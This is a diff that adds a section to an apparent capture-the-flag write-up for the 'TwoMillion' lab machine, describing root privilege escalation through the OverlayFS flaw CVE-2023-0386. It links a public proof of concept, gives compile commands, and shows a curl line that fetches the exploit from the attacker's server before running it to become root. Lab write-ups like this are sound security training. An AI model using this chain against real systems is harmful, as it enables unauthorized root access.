@@ -157,5 +157,26 @@ As observed there were various findings, but what seemed of interest was an emai
 
 ---
 
+CVE-2023-0386 Proof of Concept
 
+A concise exploitation procedure is found:
+https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c 
 
+The compilation process requires libfuse for the implemention of the malicious filesystem:
+
+- apt install libfuse-dev
+- gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl
+
+Then a local python server is set up on port 9000, for a the download of the exploit on the target machine with the use of curl.
+
+curl -O http://10.10.15.190:9000/poc
+
+![shot-023](/captures/screens/TwoMillion/shot-023.png)
+
+All that was required, for the privilege escalation, was to make the scrip executable with chmod +x and then run it.
+
+![shot-024](/captures/screens/TwoMillion/shot-024.png)
+
+---
+
+Thus, we become root and have control over the entire system. With the flag captured with cat /root/root.txt
